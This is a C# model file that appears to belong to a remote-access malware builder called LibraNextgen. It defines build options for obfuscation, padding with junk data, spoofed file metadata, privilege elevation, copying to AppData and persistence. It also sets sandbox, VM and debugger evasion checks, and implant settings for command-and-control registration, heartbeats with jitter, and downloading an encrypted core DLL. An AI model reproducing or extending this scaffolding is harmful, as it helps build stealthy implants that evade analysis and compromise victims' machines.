namespace LibraNextgen.Common.Models;

public class BuildConfigRequest
{
    public string Platform { get; set; } = "x64";
    public string ApplicationType { get; set; } = "Console";
    public string ServerHost { get; set; } = "127.0.0.1";
    public int ServerPort { get; set; } = 5270;
    public bool EnableObfuscation { get; set; }
    public bool InjectJunkData { get; set; }
    public int JunkDataMb { get; set; } = 10;
    public string? IconUrl { get; set; }
    public string? CompanyName { get; set; }
    public string? FileDescription { get; set; }
    public string? ProductName { get; set; }
    public string? Copyright { get; set; }
    public string? FileVersion { get; set; }
    public bool StripSymbols { get; set; } = true;
    public bool RequireAdmin { get; set; }
    public bool CopyToAppData { get; set; }
    public bool EnablePersistence { get; set; }
    public AntiAnalysisConfig AntiAnalysis { get; set; } = new();
}

public class AntiAnalysisConfig
{
    [System.Text.Json.Serialization.JsonPropertyName("enabled")]
    public bool enabled { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("check_cpu_cores")]
    public bool check_cpu_cores { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("min_cpu_cores")]
    public int min_cpu_cores { get; set; } = 2;

    [System.Text.Json.Serialization.JsonPropertyName("check_memory")]
    public bool check_memory { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("min_memory_gb")]
    public int min_memory_gb { get; set; } = 2;

    [System.Text.Json.Serialization.JsonPropertyName("check_disk_size")]
    public bool check_disk_size { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("min_disk_gb")]
    public int min_disk_gb { get; set; } = 60;

    [System.Text.Json.Serialization.JsonPropertyName("check_debugger")]
    public bool check_debugger { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("check_vm_mac")]
    public bool check_vm_mac { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("check_username")]
    public bool check_username { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("check_usb_history")]
    public bool check_usb_history { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("min_usb_devices")]
    public int min_usb_devices { get; set; } = 2;

    [System.Text.Json.Serialization.JsonPropertyName("check_test_signing")]
    public bool check_test_signing { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("check_delay_sandbox")]
    public bool check_delay_sandbox { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("delay_seconds")]
    public int delay_seconds { get; set; } = 5;

    [System.Text.Json.Serialization.JsonPropertyName("check_installed_software")]
    public bool check_installed_software { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("min_installed_software")]
    public int min_installed_software { get; set; } = 30;

    [System.Text.Json.Serialization.JsonPropertyName("check_screen_resolution")]
    public bool check_screen_resolution { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("check_process_count")]
    public bool check_process_count { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("min_processes")]
    public int min_processes { get; set; } = 50;

    [System.Text.Json.Serialization.JsonPropertyName("check_mouse_movement")]
    public bool check_mouse_movement { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("mouse_wait_seconds")]
    public int mouse_wait_seconds { get; set; } = 10;
}

public class InjectedConfig
{
    [System.Text.Json.Serialization.JsonPropertyName("server_url")]
    public string server_url { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("register_path")]
    public string register_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("heartbeat_path")]
    public string heartbeat_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("result_path")]
    public string result_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("ws_path")]
    public string ws_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("heartbeat_interval_ms")]
    public ulong heartbeat_interval_ms { get; set; } = 3000;

    [System.Text.Json.Serialization.JsonPropertyName("jitter_percent")]
    public double jitter_percent { get; set; } = 0.2;

    [System.Text.Json.Serialization.JsonPropertyName("require_admin")]
    public bool require_admin { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("copy_to_path")]
    public string? copy_to_path { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("enable_persistence")]
    public bool enable_persistence { get; set; }

    /// Base64-encoded RSA-OAEP encrypted AES-256 key (for core DLL decryption)
    [System.Text.Json.Serialization.JsonPropertyName("encrypted_aes_key")]
    public string encrypted_aes_key { get; set; } = "";

    /// Server path to download the encrypted core DLL
    [System.Text.Json.Serialization.JsonPropertyName("core_download_path")]
    public string core_download_path { get; set; } = "";

    /// Base64-encoded PKCS#8 DER RSA private key (for decrypting the AES key)
    [System.Text.Json.Serialization.JsonPropertyName("rsa_private_key")]
    public string rsa_private_key { get; set; } = "";

    /// Anti-analysis configuration (sandbox/VM/debug detection)
    [System.Text.Json.Serialization.JsonPropertyName("anti_analysis")]
    public AntiAnalysisConfig? anti_analysis { get; set; }
}
